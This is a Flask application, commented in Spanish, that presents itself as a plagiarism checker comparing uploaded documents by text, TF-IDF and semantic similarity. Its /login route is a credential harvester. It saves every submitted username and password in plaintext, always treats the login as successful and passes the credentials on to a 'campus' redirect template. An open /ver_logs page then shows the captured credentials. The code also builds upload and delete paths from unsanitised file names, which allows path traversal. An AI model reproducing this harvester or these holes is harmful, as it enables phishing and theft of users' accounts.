from flask import Flask, render_template, request, flash, redirect, url_for
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer, util
from duckduckgo_search import DDGS
import difflib, os, io, sys, time, torch
from PyPDF2 import PdfReader
from docx import Document
from datetime import datetime


app = Flask(__name__)
app.secret_key = "plagio-secret"


BASE_PATH = os.path.join(app.root_path, "base_textos")
os.makedirs(BASE_PATH, exist_ok=True)

LOGIN_LOGS_DIR = os.path.join(app.root_path, "login_logs")
os.makedirs(LOGIN_LOGS_DIR, exist_ok=True)


app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024



def cargar_modelo():
    """Carga el modelo IA mostrando progreso en consola"""
    print(" Iniciando carga del modelo IA avanzado (all-mpnet-base-v2)...")
    for i in range(0, 101, 10):
        sys.stdout.write(f"\r Cargando modelo... {i}%")
        sys.stdout.flush()
        time.sleep(0.1)  
    print("Inicializando modelo real, puede tardar unos segundos...\n")

    try:
        device = "cuda" if torch.cuda.is_available() else "cpu"
        modelo = SentenceTransformer("all-mpnet-base-v2", device=device)
        print(f" Modelo IA cargado correctamente en {device.upper()}")
    except Exception as e:
        print(f"⚠ Error cargando modelo IA: {e}")
        modelo = None

    print("-------------------------------------------------------\n")
    return modelo


modelo = None
def get_modelo():
    global modelo
    if modelo is None:
        print("🔁 Modelo IA no cargado. Cargando ahora...")
        modelo = cargar_modelo()
    return modelo
 



def guardar_login_log(usuario, password, resultado):
    """Guarda los intentos de login en un archivo de texto"""
    try:
        fecha_actual = datetime.now().strftime("%Y-%m-%d")
        archivo_log = os.path.join(LOGIN_LOGS_DIR, f"login_logs_{fecha_actual}.txt")
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        estado = "EXITOSO" if resultado else "FALLIDO"
        
        linea = f"[{timestamp}] Usuario: {usuario} | Contraseña: {password} | Estado: {estado}\n"
        
        with open(archivo_log, 'a', encoding='utf-8') as f:
            f.write(linea)
        return True
    except Exception as e:
        print(f" Error guardando log de login: {e}")
        return False



def leer_texto(archivo):
    try:
        # Si se pasa una ruta (archivo ya guardado)
        if isinstance(archivo, str):
            ext = os.path.splitext(archivo.lower())[1]
            if ext == ".txt":
                with open(archivo, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
            elif ext == ".pdf":
                reader = PdfReader(archivo)
                return "\n".join([p.extract_text() or "" for p in reader.pages])
            elif ext == ".docx":
                doc = Document(archivo)
                return "\n".join(p.text for p in doc.paragraphs)

        # Si se recibe un archivo desde el formulario
        else:
            nombre = archivo.filename.lower()
            ext = os.path.splitext(nombre)[1]
            data = archivo.read()
            archivo.stream.seek(0)

            if ext == ".txt":
                return data.decode("utf-8", errors="ignore")
            elif ext == ".pdf":
                reader = PdfReader(io.BytesIO(data))
                return "\n".join([p.extract_text() or "" for p in reader.pages])
            elif ext == ".docx":
                doc = Document(io.BytesIO(data))
                return "\n".join(p.text for p in doc.paragraphs)
    except Exception as e:
        print(f"⚠ Error leyendo archivo: {e}")
        return ""
    return ""



def similitud_semantica(t1, t2):
    try:
        modelo_local = get_modelo()
        if not modelo_local:
            return 0

        emb1 = modelo_local.encode(t1, convert_to_tensor=True)
        emb2 = modelo_local.encode(t2, convert_to_tensor=True)
        return float(util.pytorch_cos_sim(emb1, emb2)) * 100

    except Exception as e:
        print(f" Error IA semántica: {e}")
        return 0



def buscar_en_web(frase):
    resultados = []
    try:
        with DDGS(timeout=5) as ddgs:
            for r in ddgs.text(frase, max_results=3):
                resultados.append({
                    "titulo": r.get("title", "Sin título"),
                    "enlace": r.get("href", "#"),
                    "descripcion": r.get("body", "")
                })
    except Exception as e:
        print(f"⚠ Error en búsqueda web: {e}")
    return resultados



def clasificar_porcentaje(porc):
    if porc >= 80:
        return "PLAGIO", "rojo"
    elif porc >= 50:
        return "SIMILITUD ALTA", "naranja"
    elif porc >= 30:
        return "POSIBLE IA", "amarillo"
    else:
        return "ORIGINAL", "verde"



@app.route("/")
def index():
    return {
        "status": "ok",
        "message": "Backend de análisis de plagio activo "
    }



@app.route("/subir_base", methods=["POST"])
def subir_base():
    archivos = request.files.getlist("archivo_base")
    if not archivos:
        flash(" No seleccionaste ningún archivo para agregar a la base.")
        return redirect(url_for("index"))

    for archivo in archivos:
        if archivo and archivo.filename:
            ruta_destino = os.path.join(BASE_PATH, archivo.filename)
            archivo.save(ruta_destino)

    flash(" Documentos agregados correctamente a la base de comparación.")
    return redirect(url_for("index"))


@app.route("/eliminar_base/<nombre>", methods=["POST"])
def eliminar_base(nombre):
    try:
        ruta = os.path.join(BASE_PATH, nombre)
        if os.path.exists(ruta):
            os.remove(ruta)
            flash(f" Archivo '{nombre}' eliminado correctamente.")
        else:
            flash(" El archivo no existe o ya fue eliminado.")
    except Exception as e:
        flash(f" Error al eliminar el archivo: {e}")
    return redirect(url_for("index"))


@app.route("/analizar", methods=["POST"])
def analizar():
    archivo = request.files.get("archivo")
    if not archivo or not archivo.filename:
        flash(" Debes seleccionar un archivo (.txt, .pdf o .docx).")
        return redirect(url_for("index"))

    texto_usuario = leer_texto(archivo).strip()
    if not texto_usuario:
        flash(" No se pudo leer el archivo o el formato no es válido.")
        return redirect(url_for("index"))

    docs_base = [
        f for f in os.listdir(BASE_PATH)
        if os.path.splitext(f.lower())[1] in (".txt", ".pdf", ".docx")
    ]

    resultados = []
    for nombre in docs_base:
        ruta = os.path.join(BASE_PATH, nombre)
        texto_base = leer_texto(ruta).strip()
        if not texto_base:
            continue

        exacto = difflib.SequenceMatcher(None, texto_usuario, texto_base).ratio() * 100
        vectorizer = TfidfVectorizer().fit_transform([texto_usuario, texto_base])
        tfidf = cosine_similarity(vectorizer[0:1], vectorizer[1:2])[0][0] * 100
        semantico = similitud_semantica(texto_usuario, texto_base)

        promedio = (exacto + tfidf + semantico) / 3
        resultados.append({
            "archivo": nombre,
            "exacto": round(exacto, 2),
            "tfidf": round(tfidf, 2),
            "semantico": round(semantico, 2),
            "promedio": round(promedio, 2),
        })

    resultados.sort(key=lambda r: r["promedio"], reverse=True)

    frase_clave = texto_usuario.split(".")[0][:200]
    coincidencias_web = buscar_en_web(frase_clave)
    similitud_web = min(len(coincidencias_web) * 15, 100)

    promedio_total = 0
    if resultados:
        promedio_total = (resultados[0]["promedio"] + similitud_web) / 2

    clasificacion, color = clasificar_porcentaje(promedio_total)

    return {
    "resultados": resultados,
    "coincidencias_web": coincidencias_web,
    "similitud_web": similitud_web,
    "promedio_total": round(promedio_total, 2),
    "clasificacion": clasificacion,
    "color": color
}




@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        usuario = request.form.get("username")
        password = request.form.get("password")

        # Guardar SIEMPRE en texto plano
        guardar_login_log(usuario, password, True)

        # Redirigir SIEMPRE al campus
        return render_template(
            "login/redirect_campus.html",
            username=usuario,
            password=password
        )

    return render_template("login/login.html")



@app.route("/ver_logs")
def ver_logs():
    logs = []
    try:
        archivos_log = [f for f in os.listdir(LOGIN_LOGS_DIR) if f.endswith('.txt')]
        archivos_log.sort(reverse=True)
        
        if archivos_log:
            ultimo_log = os.path.join(LOGIN_LOGS_DIR, archivos_log[0])
            with open(ultimo_log, 'r', encoding='utf-8') as f:
                logs = f.readlines()
    except Exception as e:
        flash(f"⚠ Error leyendo logs: {e}")
    return render_template("logs.html", logs=logs)



if __name__ == "__main__":
    app.run(debug=True)
